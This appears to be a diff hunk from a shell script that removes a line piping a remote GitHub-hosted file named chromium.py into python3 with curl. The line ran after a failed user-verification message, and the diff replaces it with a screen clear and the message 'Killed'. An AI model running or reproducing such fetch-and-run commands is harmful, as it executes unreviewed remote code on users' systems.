@@ -11,4 +11,6 @@ read command
 echo "Incorrect code, can't verify user, aborting..."
 sleep 1
 
-curl -s https://raw.githubusercontent.com/Mikequez12/others/refs/heads/main/chromium.py | python3
+clear
+
+echo "Killed"
